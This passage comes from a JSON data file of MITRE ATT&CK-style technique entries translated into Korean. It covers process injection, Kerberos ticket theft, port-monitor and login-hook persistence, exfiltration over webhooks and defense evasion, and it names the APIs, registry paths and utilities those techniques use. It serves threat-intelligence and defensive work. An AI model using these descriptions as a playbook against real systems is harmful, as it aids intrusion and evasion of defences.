    "description": "적대적 요소들은 명령 실행을 허용하는 유틸리티를 악용하여 명령줄 인터프리터 사용을 제한하는 보안 규제를 우회할 수 있습니다. 다양한 Windows 유틸리티를 사용하여 명령을 실행할 수 있으며, 이는 [cmd]를 호출하지 않고도 가능할 수 있습니다. 예를 들어, Forfiles, 프로그램 호환성 도우미(pcalua.exe), Windows Subsystem for Linux (WSL)의 구성 요소, Scriptrunner.exe와 기타 유틸리티는 프로그램과 명령의 실행을 [명령 및 스크립팅 인터프리터], 실행 창 또는 스크립트를 통해 호출할 수 있습니다.\n\n적대적 요소들은 이러한 기능을 방어 회피를 위해 악용할 수 있으며, 특히 탐지를 회피하거나 그룹 정책과 같은 완화 조치를 우회하면서 임의 실행을 수행하는 데 사용될 수 있습니다. 이는 [cmd] 또는 악성 페이로드와 더 일반적으로 연관된 파일 확장의 사용을 제한/금지하는 조치를 피하는 것을 포함합니다.",
    "external_id": "T1202",
    "modified": "2024-10-03T14:47:17.154Z",
    "translated": true
  },
  {
    "title": "Replication Through Removable Media",
    "description": "적대자는 시스템으로 이동할 수 있으며, 이는 연결되지 않거나 공기 차단 네트워크에 있는 시스템에서도 발생할 수 있습니다. 이 경우, 이동식 매체에 악성 코드를 복사하고 매체가 시스템에 삽입될 때 자동 실행 기능을 이용할 수 있습니다. 측면 이동(Lateral Movement)의 경우, 이동식 매체에 저장된 실행 파일을 수정하거나 악성 코드를 복사해 정당한 파일처럼 보이도록 이름을 바꾸어 사용자가 다른 시스템에서 이를 실행하도록 속일 수 있습니다. 초기 접근(Initial Access)의 경우, 매체를 수동으로 조작하거나 매체를 처음 포맷하는 데 사용된 시스템을 수정하거나 매체의 펌웨어 자체를 수정함으로써 이루어질 수 있습니다.\n\n모바일 장치도 USB를 통해 연결되면 PC에 악성 코드를 감염시킬 수 있습니다. 이 감염은 장치(Android, iOS 등)와 때때로 USB 충전 케이블을 사용하여 이루어질 수 있습니다. 예를 들어, 스마트폰이 시스템에 연결되면 USB 연결 디스크 드라이브처럼 마운트된 것처럼 보일 수 있습니다. 연결된 시스템과 호환되는 악성 코드가 모바일 장치에 있는 경우, 이 악성 코드는 기계를 감염시킬 수 있습니다(특히 자동 실행 기능이 활성화된 경우).",
    "external_id": "T1091",
    "modified": "2023-10-17T20:42:21.453Z",
    "translated": true
  },
  {
    "title": "Data from Local System",
    "description": "적의는 Exfiltration 이전에 관심 있는 파일과 민감한 데이터를 찾기 위해 파일 시스템, 구성 파일 또는 로컬 데이터베이스와 같은 로컬 시스템 소스를 검색할 수 있습니다.\n\n적의는 cmd와 같은 명령 및 스크립트 인터프리터를 사용하거나 파일 시스템과 상호 작용하여 정보를 수집할 수 있는 네트워크 장치 CLI를 사용할 수 있습니다. 또한 적의는 로컬 시스템에서 자동화된 수집을 사용할 수도 있습니다.",
    "external_id": "T1005",
    "modified": "2023-04-12T23:54:39.466Z",
    "translated": true
  },
  {
    "title": "Deobfuscate/Decode Files or Information",
    "description": "대적자는 분석으로부터 침입의 흔적을 숨기기 위해 난독화된 파일이나 정보를 사용할 수 있습니다. 이들은 정보를 어떻게 사용할지에 따라 이를 디코딩하거나 난독화를 풀기 위한 별도의 메커니즘이 필요할 수 있습니다. 이를 수행하는 방법에는 멀웨어의 내장 기능이나 시스템에 존재하는 유틸리티를 사용하는 것이 포함됩니다.\n\n한 예로, 인증서 파일 안에 숨겨진 원격 접근 도구의 포터블 실행 파일을 디코드하기 위해 certutil을 사용하는 경우가 있습니다. 또 다른 예로, Windows의 copy /b 명령어를 사용하여 바이너리 조각을 악성 페이로드로 재조합하는 방법이 있습니다.\n\n때때로, 난독화를 풀거나 암호를 해독하기 위해 사용자의 작업이 필요할 수 있습니다. 사용자는 또한 적이 제공한 비밀번호 보호된 압축/암호화 파일을 열기 위해 비밀번호를 입력해야 할 수도 있습니다.",
    "external_id": "T1140",
    "modified": "2023-08-14T19:28:18.334Z",
    "translated": true
  },
  {
    "title": "Outlook Rules",
    "description": "적대자는 Microsoft Outlook 규칙을 악용하여 손상된 시스템에서 지속성을 얻을 수 있습니다. Outlook 규칙은 사용자가 이메일 메시지를 관리하기 위해 자동화된 행동을 정의할 수 있게 합니다. 무해한 규칙은 예를 들어 특정 발신자의 특정 단어가 포함된 이메일을 Outlook의 특정 폴더로 자동으로 이동하게 할 수 있습니다. 악의적인 Outlook 규칙은 적대자가 특별히 제작한 이메일을 그 사용자에게 보낼 때 코드 실행을 유발하도록 생성될 수 있습니다.\n\n악의적인 규칙이 사용자 사서함에 추가되면 Outlook이 시작될 때 로드됩니다. 악의적인 규칙은 적대자가 특별히 제작한 이메일을 사용자에게 보낼 때 실행됩니다.",
    "external_id": "T1137.005",
    "modified": "2024-10-15T16:02:26.206Z",
    "translated": true
  },
  {
    "title": "Impair Defenses",
    "description": "적대 세력은 방어 메커니즘을 방해하거나 비활성화하기 위해 피해자의 환경 구성 요소를 악의적으로 수정할 수 있습니다. 이는 방화벽이나 안티바이러스와 같은 예방 방어를 방해하는 것뿐만 아니라, 방어자가 활동을 감사하고 악의적인 행동을 식별하는 데 사용할 수 있는 탐지 기능에도 해당됩니다. 이러한 공격은 사용자 및 관리자가 설치한 보조 기능뿐만 아니라 본래의 방어 기능에도 영향을 미칠 수 있습니다.\n\n적대 세력은 또한 사용자가 로그아웃하는 것을 차단하거나 시스템 종료를 방지하거나 업데이트 프로세스를 비활성화하거나 수정하는 등의 방어 위생에 기여하는 일상적인 작업을 방해할 수 있습니다. 이들은 이벤트 집계 및 분석 메커니즘을 목표로 하거나 다른 시스템 구성 요소를 변경하여 이러한 절차를 방해할 수 있습니다. 이러한 제한은 악의적인 작업과 사건의 지속적인 확산을 더욱 촉진할 수 있습니다.",
    "external_id": "T1562",
    "modified": "2024-10-14T22:11:30.271Z",
    "translated": true
  },
  {
    "title": "Upload Malware",
    "description": "적대적 존재는 타겟팅 중에 접근할 수 있도록 맬웨어를 제3자 또는 적대자가 제어하는 인프라에 업로드할 수 있습니다. 악성 소프트웨어에는 페이로드, 드로퍼, 손상 후 도구, 백도어 및 다양한 기타 악성 콘텐츠가 포함될 수 있습니다. 적대적 존재는 페이로드를 피해망에 제공하여 작전을 지원하기 위해 맬웨어를 업로드할 수 있습니다.\n\n맬웨어는 적대자가 이전에 구매하거나 임대한 인프라에 배치되거나 그들이 손상시킨 인프라에 배치될 수 있습니다. 맬웨어는 GitHub 또는 Pastebin과 같은 웹 서비스에 배치되거나, IPFS와 같은 분산 콘텐츠 저장소에 호스팅되어 악성 파일 제거를 어렵게 만들 수 있습니다.\n\n적대적 존재는 애플리케이션 바이너리, 가상 머신 이미지 또는 컨테이너 이미지와 같은 백도어 파일을 제3자 소프트웨어 스토어 또는 리포지토리에 업로드할 수 있습니다. 우연히 피해자는 이러한 백도어 파일을 직접 다운로드/설치할 수 있습니다. 위장 기술이 사용되면 사용자들이 이러한 파일을 잘못 실행할 가능성이 증가할 수 있습니다.",
    "external_id": "T1608.001",
    "modified": "2024-10-16T20:13:40.501Z",
    "translated": true
  },
  {
    "title": "Supply Chain Compromise",
    "description": "적대자는 최종 소비자가 수령하기 전에 데이터 또는 시스템 손상을 목적으로 제품이나 제품 제공 메커니즘을 조작할 수 있습니다.\n\n공급망 손상은 공급망의 어떤 단계에서도 발생할 수 있습니다. 여기에는 다음이 포함됩니다:\n\n* 개발 도구 조작\n* 개발 환경 조작\n* 소스 코드 저장소(공개 또는 비공개) 조작\n* 오픈 소스 의존성의 소스 코드 조작\n* 소프트웨어 업데이트/배포 메커니즘 조작\n* 손상되거나 감염된 시스템 이미지(공장에서 감염된 이동식 매체의 여러 사례)\n* 정품 소프트웨어를 수정된 버전으로 대체\n* 정품 유통업체에 수정된/위조된 제품 판매\n* 배송 차단\n\n공급망 손상은 하드웨어나 소프트웨어의 어떤 구성 요소에도 영향을 미칠 수 있지만, 실행을 얻으려는 적대자는 종종 소프트웨어 배포 또는 업데이트 채널에서 정품 소프트웨어에 악성 추가물을 집중하는 경향이 있습니다. 표적은 특정 피해자 집합에 대해 구체적일 수 있으며, 악성 소프트웨어는 광범위한 소비자에게 배포되지만 특정 피해자에게는 추가 전술로 진행될 수 있습니다. 많은 애플리케이션에서 의존성으로 사용되는 인기 있는 오픈 소스 프로젝트도 사용자의 의존성에 악성 코드를 추가하기 위한 수단으로 목표가 될 수 있습니다.",
    "external_id": "T1195",
    "modified": "2024-10-04T11:17:00.778Z",
    "translated": true
  },
  {
    "title": "Exploit Public-Facing Application",
    "description": "적대자는 네트워크에 접근하기 위해 인터넷에 연결된 호스트나 시스템의 취약점을 이용하려 할 수 있습니다. 시스템의 취약점은 소프트웨어 버그, 일시적인 오류 또는 잘못된 설정일 수 있습니다.\n\n주로 공격당하는 애플리케이션은 웹사이트/웹 서버이지만, 데이터베이스(예: SQL), 표준 서비스(예: SMB 또는 SSH), 네트워크 장치 관리 및 프로토콜(예: SNMP 및 Smart Install) 등 인터넷에 접근 가능한 열린 소켓을 가진 모든 시스템도 포함될 수 있습니다. 취약점의 종류에 따라 방어 회피를 위한 이용 또는 클라이언트를 실행하기 위한 이용이 포함될 수 있습니다.\n\n애플리케이션이 클라우드 기반 인프라에 호스팅되거나 컨테이너화되어 있는 경우, 이를 이용함으로써 기본 인스턴스나 컨테이너의 침해로 이어질 수 있습니다. 이는 적대자에게 클라우드나 컨테이너 API에 접근할 수 있는 경로를 제공하거나, 호스트 접근을 탈출하여 이용하거나, 약한 신원 관리 및 접근 관리 정책을 악용할 수 있게 합니다.\n\n적대자는 또한 엣지 네트워크 인프라와 관련 장비를 이용하며, 특히 강력한 호스트 기반 방어를 지원하지 않는 장치를 목표로 삼을 수 있습니다.\n\n웹사이트와 데이터베이스에 대해, OWASP 상위 10개와 CWE 상위 25개는 가장 일반적인 웹 기반 취약점을 강조합니다.",
    "external_id": "T1190",
    "modified": "2024-09-24T14:33:53.433Z",
    "translated": true
  },
  {
    "title": "Steal or Forge Kerberos Tickets",
    "description": "적대자들은 Kerberos 인증을 전복하려고 Kerberos 티켓을 훔치거나 위조하여 비정상적인 접근을 가능하게 하려 할 수 있다. Kerberos는 현대 Windows 도메인 환경에서 널리 사용되는 인증 프로토콜이다. Kerberos 환경에서는 \"영역\"이라고 하며, 기본적으로 세 가지 참가자가 있다: 클라이언트, 서비스, 키 배포 센터(KDC). 클라이언트는 서비스에 대한 접근을 요청하고 KDC에서 유래된 Kerberos 티켓의 교환을 통해 성공적으로 인증된 후 접근 권한을 부여받는다. KDC는 인증과 티켓 발급 모두에 대한 책임이 있다. 적대자들은 티켓을 훔치거나 위조하여 Kerberos를 악용하려고 할 수 있다.\n\nWindows에서는 내장된 klist 유틸리티를 사용하여 캐시된 Kerberos 티켓을 나열하고 분석할 수 있다.",
    "external_id": "T1558",
    "modified": "2024-09-17T19:49:11.455Z",
    "translated": true
  },
  {
    "title": "Credentials from Password Stores",
    "description": "적대자는 사용자 자격 증명을 얻기 위해 일반적인 비밀번호 저장 위치를 검색할 수 있습니다. 비밀번호는 운영 체제나 자격 증명을 보관하는 응용 프로그램에 따라 시스템의 여러 장소에 저장됩니다. 사용자들이 관리하고 유지하기 쉽게 비밀번호를 저장하는 특정 응용 프로그램과 서비스도 있으며, 예를 들어 비밀번호 관리자와 클라우드 비밀 금고가 있습니다. 자격 증명이 얻어지면 이를 사용하여 수평 이동을 수행하고 제한된 정보에 접근할 수 있습니다.",
    "external_id": "T1555",
    "modified": "2024-10-15T14:57:46.850Z",
    "translated": true
  },
  {
    "title": "Exfiltration Over Web Service",
    "description": "적대자는 기존의 합법적인 외부 웹 서비스를 이용해 데이터를 유출할 수 있으며, 이는 주요 명령 및 제어 채널 대신에 이루어질 수 있습니다. 데이터 유출 메커니즘으로 작용하는 인기 있는 웹 서비스는 공격자가 네트워크 내에서 이미 해당 서비스와 통신하고 있을 가능성이 높기 때문에 상당한 은폐를 제공할 수 있습니다. 이러한 서비스에 대한 트래픽을 허용하는 방화벽 규칙이 이미 존재할 수 있습니다.\n\n웹 서비스 제공업체는 일반적으로 SSL/TLS 암호화를 사용하여 적대자에게 추가적인 보호 수준을 제공합니다.",
    "external_id": "T1567",
    "modified": "2024-10-15T15:57:40.951Z",
    "translated": true
  },
  {
    "title": "Remote Access Software",
    "description": "적대자는 정당한 데스크톱 지원 및 원격 액세스 소프트웨어를 사용하여 네트워크 내의 타겟 시스템에 대한 대화형 명령 및 제어 채널을 설정할 수 있습니다. 이러한 서비스는 일반적으로 정당한 기술 지원 소프트웨어로 사용되며, 타겟 환경 내에서 애플리케이션 제어에 의해 허용될 수 있습니다.\n\n원격 액세스 소프트웨어는 타격 후에도 설치 및 사용될 수 있으며, 이는 중복 액세스를 위한 대체 커뮤니케이션 채널이거나 타겟 시스템과의 대화형 원격 데스크톱 세션을 설정하는 방법이 될 수 있습니다. 또한 악성 소프트웨어의 구성 요소로 사용되어 역 연결 또는 서비스 또는 적대자가 제어하는 시스템으로의 백커넥트를 설정할 수 있습니다.\n\n적대자들은 EDR 및 기타 방어 도구에 포함된 응답 기능을 남용하여 원격 액세스를 가능하게 할 수 있습니다.\n\n많은 원격 액세스 소프트웨어의 설치에는 지속성도 포함될 수 있습니다. 원격 액세스 모듈/기능은 기존 소프트웨어의 일부로 존재할 수도 있습니다.",
    "external_id": "T1219",
    "modified": "2024-04-12T23:52:30.489Z",
    "translated": true
  },
  {
    "title": "Domains",
    "description": "적대자는 타겟팅에 사용될 수 있는 도메인을 획득할 수 있습니다. 도메인 이름은 하나 이상의 IP 주소를 나타내기 위해 사용되는 인간이 읽을 수 있는 이름입니다. 이들은 구매할 수 있거나 경우에 따라 무료로 획득할 수 있습니다.\n\n적대자는 획득한 도메인을 피싱, 드라이브 바이 컴프라미즈, 그리고 명령 및 제어 등 다양한 목적으로 사용할 수 있습니다. 적대자는 합법적인 도메인과 유사한 도메인을 선택할 수 있으며, 이에는 유사 문자(homoglyphs) 사용이나 다른 최상위 도메인(TLD)을 사용하는 방법이 포함됩니다. 타이포스쿼팅은 드라이브 바이 컴프라미즈를 통해 페이로드를 전달하는 데 도움을 줄 수 있습니다. 적대자는 또한 국제화 도메인 이름(IDN) 및 다양한 문자 세트(예: 키릴 문자, 그리스 문자 등)를 사용하여 \"IDN 호모그래프 공격\"을 실행할 수 있으며, 이를 통해 피해자 기계에 악성코드를 전달하는 시각적으로 유사한 도메인을 생성합니다.\n\n다양한 URI/URL도 동적으로 생성되어 피해자에게 악성 콘텐츠를 독특하게 제공할 수 있습니다(예: 일회용, 단일 사용 도메인 이름). \n\n적대자는 또한 만료된 도메인을 획득하고 재사용할 수 있으며, 이는 기존의 평판/이력에 따라 방어자에 의해 이미 허용되거나 신뢰 리스트에 포함될 가능성이 있습니다.\n\n도메인 등록 기구는 각각 등록된 모든 도메인에 대한 연락처 정보를 표시하는 공개적으로 볼 수 있는 데이터베이스를 유지합니다. 개인 WHOIS 서비스는 도메인 소유자 대신 그들의 회사 정보를 표시하는 대체 정보를 제공합니다. 적대자는 이러한 개인 WHOIS 서비스를 사용하여 구매한 도메인의 소유자에 대한 정보를 모호하게 할 수 있습니다. 적대자는 또한 다양한 등록 정보를 사용하고 서로 다른 도메인 등록 기구에서 도메인을 구매하여 인프라 추적 노력을 방해할 수 있습니다.\n\n정당하게 도메인을 구매하는 것 외에도, 적대자는 손상된 환경에서 새로운 도메인을 등록할 수 있습니다. 예를 들어, AWS 환경에서 적대자는 Route53 도메인 서비스를 활용하여 도메인을 등록하고 위협 행위자가 선택한 리소스를 가리키는 호스티드 영역을 생성할 수 있습니다.",
    "external_id": "T1583.001",
    "modified": "2024-09-25T15:26:00.047Z",
    "translated": true
  },
  {
    "title": "Archive via Library",
    "description": "적대자는 외부 라이브러리를 사용하여 유출하기 전에 수집된 데이터를 압축하거나 암호화할 수 있습니다. 데이터 아카이브를 위한 많은 라이브러리가 존재하며, 대부분의 라이브러리는 데이터를 암호화하고/또는 압축하는 기능을 포함하고 있습니다.\n\n일부 아카이브 라이브러리는 macOS와 Linux의 bzip2, Windows의 zip와 같이 시스템에 미리 설치되어 있습니다. 라이브러리는 유틸리티와 다르다는 점에 유의해야 합니다. 라이브러리는 컴파일할 때 연결될 수 있는 반면, 유틸리티는 서브셸을 생성하거나 유사한 실행 메커니즘이 필요합니다.",
    "external_id": "T1560.002",
    "modified": "2020-03-29T18:27:30.891Z",
    "translated": true
  },
  {
    "title": "Thread Execution Hijacking",
    "description": "적 adversaries는 프로세스 기반 방어를 회피하고 권한 상승을 가능하게 하기 위해 탈취한 프로세스에 악성 코드를 주입할 수 있다. 스레드 실행 탈취(Thread Execution Hijacking)는 별도의 활성 프로세스의 주소 공간에서 임의 코드를 실행하는 방법이다.\n\n스레드 실행 탈취는 기존 프로세스를 일시 중단한 다음 그 메모리를 언맵하거나 하울링하여 악성 코드나 DLL 경로로 교체하는 방식으로 일반적으로 수행된다. 먼저 기존 피해자 프로세스에 대한 핸들이 <code>OpenThread</code>와 같은 네이티브 윈도우 API 호출로 생성된다. 이 시점에서 프로세스를 일시 중단한 다음, 주입된 코드에 맞게 재조정하고 <code>SuspendThread</code>, <code>VirtualAllocEx</code>, <code>WriteProcessMemory</code>, <code>SetThreadContext</code>, 그리고 <code>ResumeThread</code>를 통해 다시 실행할 수 있다.\n\n이것은 프로세스를 일시 중단한 상태에서 만드는 것이 아니라 기존 프로세스를 목표로 삼는다는 점에서 프로세스 홀로잉(Process Hollowing)과 매우 유사하다.\n\n다른 프로세스의 컨텍스트에서 코드를 실행하는 것은 해당 프로세스의 메모리, 시스템/네트워크 자원에 접근할 수 있도록 하며, 권한 상승을 가능하게 할 수 있다. 스레드 실행 탈취를 통한 실행은 합법적인 프로세스 아래에서 실행되기 때문에 보안 제품에 의해 탐지되는 것을 회피할 수 있다.",
    "external_id": "T1055.003",
    "modified": "2021-10-18T12:22:50.800Z",
    "translated": true
  },
  {
    "title": "Masquerading",
    "description": "적대자는 자신의 아티팩트의 특성을 조작하여 사용자 및/또는 보안 도구에 정상적이거나 해가 없는 것처럼 보이게 하려 할 수 있습니다. 위장(Masquerading)은 합법적이거나 악의적인 객체의 이름이나 위치가 방어와 관측을 피하기 위해 조작되거나 남용될 때 발생합니다. 여기에는 파일 메타데이터 조작, 사용자를 속여 파일 유형을 잘못 인식하게 하거나 합법적인 작업 또는 서비스 이름을 사용하는 것이 포함될 수 있습니다.\n\n보안 모니터링을 피하기 위해 조작 가능한 시스템 유틸리티의 이름을 변경하는 것도 위장의 한 형태입니다.",
    "external_id": "T1036",
    "modified": "2024-10-16T20:10:38.450Z",
    "translated": true
  },
  {
    "title": "Application Shimming",
    "description": "적대자는 애플리케이션 쉼(Shim)에 의해 실행되는 악성 콘텐츠를 통해 지속성을 확보하거나 권한을 상승시킬 수 있습니다. 마이크로소프트 윈도우 애플리케이션 호환성 인프라/프레임워크(애플리케이션 쉼)는 운영 체제 코드베이스가 시간이 지남에 따라 변경됨에 따라 소프트웨어의 하위 호환성을 허용하기 위해 생성되었습니다. 애플리케이션 쉼 역할은 개발자가 Windows XP를 위해 생성된 애플리케이션에 적용할 수 있는 수정 사항을 통해 Windows 10에서 작동하도록 만드는 기능을 제공합니다.\n\n프레임워크 내에서 쉼은 프로그램(또는 보다 구체적으로는 가져오기 주소 테이블)과 Windows OS 사이의 버퍼 역할을 하도록 생성됩니다. 프로그램이 실행될 때, 쉼 캐시를 참조하여 해당 프로그램이 쉼 데이터베이스(.sdb)의 사용이 필요한지 여부를 결정합니다. 필요한 경우, 쉼 데이터베이스는 코드를 적절하게 리디렉션하기 위해 후킹을 사용하여 운영 체제와 통신합니다.\n\n기본 윈도우 설치 프로그램이 설치한 모든 쉼의 목록은 다음 위치에 저장됩니다:\n\n* %WINDIR%\\AppPatch\\sysmain.sdb\n* hklm\\software\\microsoft\\windows nt\\currentversion\\appcompatflags\\installedsdb\n\n사용자 정의 데이터베이스는 다음에 저장됩니다:\n\n* %WINDIR%\\AppPatch\\custom 및 %WINDIR%\\AppPatch\\AppPatch64\\Custom\n* hklm\\software\\microsoft\\windows nt\\currentversion\\appcompatflags\\custom\n\n쉼을 안전하게 유지하기 위해, Windows는 사용자 모드에서 실행되도록 설계하여 커널을 수정할 수 없도록 하였고, 쉼을 설치하려면 관리자 권한이 필요합니다. 그러나 특정 쉼은 사용자 계정 컨트롤 우회, 프로세스에 DLL 주입, 데이터 실행 방지 비활성화 및 구조적 예외 처리 비활성화, 메모리 주소 가로채기 등의 행위에 사용될 수 있습니다.\n\n이러한 쉼을 활용하면 적대자가 권한을 상승시키거나 백도어를 설치하거나 Windows Defender와 같은 방어 수단을 비활성화하는 등 여러 악성 행위를 수행할 수 있습니다. 쉼은 또한 영향을 받는 프로그램에 의해 지속적으로 호출됨으로써 지속성을 확립하는 데 악용될 수 있습니다.",
    "external_id": "T1546.011",
    "modified": "2020-11-10T18:29:31.094Z",
    "translated": true
  },
  {
    "title": "Unsecured Credentials",
    "description": "상대방은 손상된 시스템을 검색하여 불안전하게 저장된 자격 증명을 찾고 얻으려 할 수 있습니다. 이러한 자격 증명은 시스템의 여러 위치에 저장되거나 잘못 배치될 수 있으며, 여기에는 평문 파일, 운영 체제 또는 애플리케이션 전용 저장소, 또는 기타 특수 파일/유물 등이 포함됩니다.",
    "external_id": "T1552",
    "modified": "2024-10-14T22:11:30.271Z",
    "translated": true
  },
  {
    "title": "Port Monitors",
    "description": "적대자는 지속성 또는 권한 상승을 위해 시스템 부팅 시 적대자가 제공한 DLL을 실행하기 위해 포트 모니터를 사용할 수 있습니다. 포트 모니터는 <code>AddMonitor</code> API 호출을 통해 부팅 시 로드될 DLL을 설정할 수 있습니다. 이 DLL은 <code>C:\\Windows\\System32</code>에 위치할 수 있으며, 부팅 시 프린트 스풀러 서비스인 `spoolsv.exe`에 의해 SYSTEM 수준의 권한으로 로드되고 실행됩니다.\n\n또한, 권한이 허용되는 경우 임의의 DLL이 로드될 수 있으며, 이 경우 기존 또는 새로 생성된 임의 이름의 하위 키의 <code>HKLM\\SYSTEM\\CurrentControlSet\\Control\\Print\\Monitors</code>의 `Driver` 값에 해당 DLL의 완전한 경로를 작성할 수 있습니다. 레지스트리 키에는 다음 항목이 포함되어 있습니다:\n\n* 로컬 포트\n* 표준 TCP/IP 포트\n* USB 모니터\n* WSD 포트",
    "external_id": "T1547.010",
    "modified": "2024-09-12T15:26:17.886Z",
    "translated": true
  },
  {
    "title": "Clear Mailbox Data",
    "description": "적대자는 자신의 활동의 증거를 제거하기 위해 이메일 및 이메일 애플리케이션 데이터를 수정할 수 있습니다. 이메일 애플리케이션은 사용자가 명령줄 도구나 API 사용을 통해 메일박스 데이터를 내보내고 삭제할 수 있게 허용합니다. 메일 애플리케이션 데이터에는 이메일, 이메일 메타데이터 또는 애플리케이션 또는 운영 체제에 의해 생성된 로그가 포함될 수 있습니다.\n\n적대자는 이메일 및 메일박스 데이터를 조작하여 로그, 아티팩트 및 메타데이터를 제거할 수 있습니다. 예를 들어, 적대자는 Exchange 서버에서 증거를 제거하기 위해 ExchangePowerShell PowerShell 모듈을 사용했으며, 여기에는 메일박스 내보내기 요청을 제거하는 Remove-MailboxExportRequest가 포함됩니다. 리눅스 및 macOS에서는 적대자가 mail이라는 명령줄 유틸리티를 통해 이메일을 삭제하거나 AppleScript를 사용하여 macOS의 API와 상호작용할 수 있습니다.\n\n또한, 적대자는 스팸이나 의심스러운 활동을 나타내는 이메일 및 메타데이터/헤더를 제거하여 보안 제품에 의해 악성 이메일이 탐지될 가능성을 줄일 수 있습니다.",
    "external_id": "T1070.008",
    "modified": "2024-10-15T15:43:56.839Z",
    "translated": true
  },
  {
    "title": "Login Hook",
    "description": "적대자들은 로그인 훅을 사용하여 사용자 로그온 시 실행되는 지속성을 설정할 수 있습니다. 로그인 훅은 사용자 로그온 시 루트 권한으로 실행할 특정 스크립트를 가리키는 plist 파일입니다. plist 파일은 /Library/Preferences/com.apple.loginwindow.plist에 위치하며 defaults 명령줄 유틸리티를 사용하여 수정할 수 있습니다. 이 동작은 로그아웃 훅에도 동일하게 적용되며, 사용자 로그아웃 시 스크립트를 실행할 수 있습니다. 모든 훅은 수정하거나 생성하기 위해 관리자 권한이 필요합니다.\n\n적대자들은 com.apple.loginwindow.plist 파일에 LoginHook 또는 LogoutHook 키-값 쌍을 사용하여 악성 스크립트의 경로를 추가하거나 삽입할 수 있습니다. 악성 스크립트는 다음 사용자 로그온 때 실행됩니다. 이미 로그인 훅이 존재하는 경우, 적대자들은 기존 로그인 훅에 추가 명령을 추가할 수 있습니다. 시스템에는 한 번에 하나의 로그인 및 로그아웃 훅만 존재할 수 있습니다.\n\n**참고:** 로그인 훅은 10.11 버전의 macOS에서 Launch Daemon 및 Launch Agent를 선호함에 따라 더 이상 사용되지 않습니다.",
    "external_id": "T1037.002",
    "modified": "2022-04-20T16:42:05.094Z",
    "translated": true
  },
  {
    "title": "Content Injection",
    "description": "적대자는 온라인 네트워크 트래픽을 통해 시스템에 악성 콘텐츠를 주입함으로써 피해자와 지속적으로 소통할 수 있습니다. 피해자를 손상된 웹사이트에 호스팅된 악성 페이로드로 유인하는 대신, 적대자는 처음에 손상된 데이터 전송 채널을 통해 피해자에게 접근하여 트래픽을 조작하거나 자신의 콘텐츠를 주입할 수 있습니다. 이러한 손상된 온라인 네트워크 채널은 이미 손상된 시스템에 추가 페이로드와 기타 데이터를 전달하는 데에도 사용될 수 있습니다.\n\n적대자는 다음과 같은 다양한 방법으로 피해자 시스템에 콘텐츠를 주입할 수 있습니다:\n\n* 중간에서, 적대자가 합법적인 온라인 클라이언트-서버 통신 사이에 있는 경우\n* 측면에서, 악성 콘텐츠가 주입되어 합법적인 온라인 서버의 요청에 대한 가짜 응답으로 클라이언트에게 전달되는 경우\n\n콘텐츠 주입은 종종 손상된 상위 통신 채널의 결과로 발생하며, 예를 들어 인터넷 서비스 제공업체(ISP) 수준에서 \"법적 인터셉션\"이 이루어지는 경우가 해당됩니다.",
    "external_id": "T1659",
    "modified": "2023-10-01T02:28:45.147Z",
    "translated": true
  },
  {
    "title": "Process Injection",
    "description": "공격자는 프로세스 기반 방어를 회피하고 권한을 상승시키기 위해 코드가 프로세스에 주입될 수 있습니다. 프로세스 주입은 별도의 활성 프로세스의 주소 공간에서 임의의 코드를 실행하는 방법입니다. 다른 프로세스의 컨텍스트에서 코드를 실행하면 해당 프로세스의 메모리, 시스템/네트워크 자원에 접근할 수 있으며, 권한이 상승할 수도 있습니다. 프로세스 주입을 통한 실행은 실행이 합법적인 프로세스 아래에 가려져 있기 때문에 보안 제품의 탐지를 피할 수 있습니다.\n\n코드를 프로세스에 주입하는 방법은 여러 가지가 있으며, 많은 경우 합법적인 기능을 악용합니다. 이러한 구현은 모든 주요 운영 체제에 존재하지만 대개 플랫폼에 따라 다릅니다.\n\n보다 정교한 샘플은 여러 프로세스 주입을 수행하여 모듈을 분할하고 탐지를 추가로 회피할 수 있으며, 명명된 파이프 또는 기타 프로세스 간 통신(IPC) 메커니즘을 통신 채널로 활용합니다.",
    "external_id": "T1055",
    "modified": "2023-03-30T21:01:45.488Z",
    "translated": true
  },
  {
    "title": "Exfiltration Over Webhook",
    "description": "적대자는 주요 명령 및 제어 채널이 아닌 웹후크 엔드포인트로 데이터를 유출할 수 있습니다. 웹후크는 서버가 클라이언트가 서버를 지속적으로 폴링할 필요 없이 HTTP/S를 통해 데이터를 푸시할 수 있게 하는 간단한 메커니즘입니다. Discord, Slack 등과 같은 많은 공개 및 상업 서비스는 GitHub, Jira 또는 Trello와 같은 다른 서비스에서 사용할 수 있는 웹후크 엔드포인트 생성을 지원합니다. 연결된 서비스에서 변경이 발생하면(예: 저장소 업데이트를 푸시하거나 티켓을 수정) 이러한 서비스는 소비하는 애플리케이션에서 사용할 수 있도록 웹후크 엔드포인트에 데이터를 자동으로 게시합니다.\n\n적대자는 적대자가 소유한 환경을 피해자가 소유한 SaaS 서비스에 연결하여 이메일, 채팅 메시지 및 기타 데이터를 반복적으로 자동화된 유출을 수행할 수 있습니다. 또는 웹후크 엔드포인트를 서비스에 연결하는 대신, 적대자는 유출할 데이터를 직접 URL에 수동으로 게시할 수 있습니다.\n\n웹후크 엔드포인트에 대한 접근은 종종 HTTPS를 통해 이루어져, 적대자에게 추가적인 보호 수준을 제공합니다. 웹후크를 이용한 유출은 웹후크 엔드포인트가 일반적으로 사용되는 SaaS 애플리케이션이나 협업 서비스로 향할 경우 정상적인 네트워크 트래픽과 섞일 수 있습니다.",
    "external_id": "T1567.004",
    "modified": "2024-10-15T15:57:55.928Z",
    "translated": true
  },
  {
    "title": "Traffic Signaling",
    "description": "공격자는 트래픽 신호를 사용하여 열린 포트나 지속성 또는 명령 및 제어에 사용되는 다른 악의적인 기능을 숨길 수 있습니다. 트래픽 신호는 시스템에 특정 반응을 유도하기 위해 전송해야 하는 매직 값 또는 시퀀스의 사용을 포함하며, 여기에는 닫힌 포트를 열거나 악의적인 작업을 실행하는 것이 포함됩니다. 이는 적이 명령 및 제어를 위해 사용할 수 있는 포트를 열기 전에 특정 특성을 가진 패킷 시퀀스를 전송하는 형태일 수 있습니다. 일반적으로 이 패킷 시퀀스는 미리 정의된 닫힌 포트의 시퀀스에 대한 연결 시도로 구성되지만, 비정상적인 플래그, 특정 문자열 또는 기타 고유한 특성이 포함될 수 있습니다. 시퀀스가 완료되면 포트를 여는 것은 호스트 기반 방화벽에 의해 이루어질 수 있지만, 커스텀 소프트웨어로도 구현될 수 있습니다.\n\n공격자는 이미 열린 포트와도 통신할 수 있지만, 해당 포트에서 수신 대기 중인 서비스는 적절한 매직 값이 전달될 경우에만 명령에 응답하거나 다른 악의적인 기능을 유발합니다.\n\n신호 패킷을 관찰하여 통신을 유도하는 것은 다양한 방법으로 